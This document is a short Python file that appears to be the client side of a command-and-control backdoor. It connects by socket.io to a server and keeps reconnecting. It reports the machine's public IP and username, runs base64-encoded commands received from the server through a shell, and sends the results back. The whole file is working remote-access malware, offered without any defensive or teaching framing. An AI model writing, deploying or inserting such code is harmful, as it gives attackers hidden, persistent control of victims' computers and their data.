import socketio, json, os, requests, base64, subprocess

def main():
    socket = socketio.Client(
        reconnection=True,
        reconnection_attempts=99999999,
        reconnection_delay=1,
        reconnection_delay_max=2
    )

    @socket.event
    def connect():
        print("Connected to server")
        ip_adress = requests.get("https://api.ipify.org").text
        socket.emit("init", json.dumps({"ip": ip_adress, "username": os.getlogin()}))

    @socket.event
    def command(cmd):
        decoded_cmd = base64.b64decode(cmd).decode()
        try:
            # if decoded_cmd[:2] == "cd":
            #     os.chdir(decoded_cmd[3:])
            #     return
            output = subprocess.check_output(decoded_cmd.split(" "), shell=True)
            socket.emit("result", json.dumps({"result": base64.b64encode(output).decode(), "cmd": decoded_cmd}))
        except Exception as e:
            socket.emit("result", json.dumps({"result": base64.b64encode(str(e).encode()).decode(), "cmd": decoded_cmd}))

    socket.connect("http://127.0.0.1:5000")
    socket.wait()

while True:
    try:
        main()
    except:
        main()
